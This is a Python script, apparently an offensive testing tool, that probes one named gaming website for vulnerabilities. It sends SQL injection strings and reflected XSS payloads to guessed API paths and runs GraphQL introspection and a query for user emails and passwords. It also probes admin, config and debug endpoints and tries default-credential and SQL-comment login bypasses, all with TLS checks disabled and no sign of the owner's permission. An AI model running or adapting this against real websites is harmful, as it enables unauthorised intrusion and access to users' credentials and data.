#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""Deep vulnerability test for insomniagamingegypt.com"""
import requests
import urllib3
import json

urllib3.disable_warnings()

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Content-Type': 'application/json'
})

base = 'https://insomniagamingegypt.com'

print("=" * 70)
print("DEEP VULNERABILITY TEST")
print("=" * 70)

# 1. SQL Injection Tests
print("\n[*] SQL Injection Tests")
print("-" * 40)

sqli_params = [
    '/api/users?id=1',
    '/api/users?id=1\'',
    '/api/users?id=1" OR "1"="1',
    '/api/products?category=1',
    '/api/products?category=1\'',
    '/api/search?q=test',
    '/api/search?q=test\' OR \'1\'=\'1',
    '/users?userId=1',
    '/users?userId=1\'',
]

for path in sqli_params:
    url = base + path
    try:
        r = s.get(url, timeout=10, verify=False)
        sql_errors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'odbc', 'microsoft sql']
        has_error = any(e in r.text.lower() for e in sql_errors)
        
        status = f"{r.status_code}"
        if has_error:
            status = f"{r.status_code} [SQL ERROR!]"
            print(f"\n[!] SQL INJECTION FOUND: {path}")
            print(f"    Response: {r.text[:300]}")
        else:
            print(f"    GET {path[:50]:50} | {status}")
    except Exception as e:
        print(f"    GET {path[:50]:50} | ERROR: {str(e)[:30]}")

# 2. XSS Tests
print("\n[*] XSS Tests")
print("-" * 40)

xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
]

for payload in xss_payloads[:3]:
    paths = [
        f'/api/search?q={payload}',
        f'/search?q={payload}',
        f'/api/users?name={payload}',
    ]
    for path in paths:
        url = base + path
        try:
            r = s.get(url, timeout=10, verify=False)
            if payload in r.text:
                print(f"\n[!] XSS FOUND: {path}")
                print(f"    Payload reflected in response!")
            else:
                print(f"    GET {path[:50]:50} | {r.status_code}")
        except Exception as e:
            pass

# 3. GraphQL Tests
print("\n[*] GraphQL Tests")
print("-" * 40)

graphql_queries = [
    ('Introspection', '{"query":"{__schema{types{name}}}"}'),
    ('Get Users', '{"query":"{users{id email password}}"}'),
    ('Get All', '{"query":"{__schema{queryType{fields{name}}}}"}'),
]

for name, query_str in graphql_queries:
    url = base + '/graphql'
    try:
        r = s.post(url, json=json.loads(query_str), timeout=10, verify=False)
        data = r.json() if r.text else {}
        
        if 'errors' not in data and 'data' in data:
            print(f"\n[!] GRAPHQL EXPOSURE: {name}")
            print(f"    Response: {json.dumps(data)[:200]}")
        else:
            print(f"    {name}: {r.status_code} - {str(data)[:50]}")
    except Exception as e:
        print(f"    {name}: ERROR - {str(e)[:30]}")

# 4. Check specific API endpoints
print("\n[*] API Endpoint Analysis")
print("-" * 40)

endpoints = [
    '/api',
    '/api/v1',
    '/api/v2', 
    '/api/users',
    '/api/users/1',
    '/api/products',
    '/api/orders',
    '/api/admin',
    '/api/config',
    '/api/debug',
]

for ep in endpoints:
    url = base + ep
    try:
        r = s.get(url, timeout=5, verify=False)
        if r.status_code == 200:
            # Check what data is exposed
            try:
                data = r.json()
                keys = list(data.keys()) if isinstance(data, dict) else 'list'
                print(f"    {ep:20} | 200 | Keys: {keys}")
            except:
                print(f"    {ep:20} | {r.status_code} | {r.text[:50]}")
        elif r.status_code not in [404, 401, 403]:
            print(f"    {ep:20} | {r.status_code}")
    except Exception as e:
        pass

# 5. Form testing
print("\n[*] Form/POST Testing")
print("-" * 40)

forms = [
    ('/api/auth/login', {'email': 'admin@insomnia.com', 'password': 'admin'}),
    ('/api/auth/login', {'email': "admin'--", 'password': 'test'}),
    ('/api/auth/register', {'email': 'test@test.com', 'password': 'test123'}),
]

for path, data in forms:
    url = base + path
    try:
        r = s.post(url, json=data, timeout=10, verify=False)
        print(f"    POST {path:30} | {r.status_code} | {r.text[:100]}")
    except Exception as e:
        print(f"    POST {path:30} | ERROR: {str(e)[:30]}")

print("\n" + "=" * 70)
print("TEST COMPLETE")
print("=" * 70)
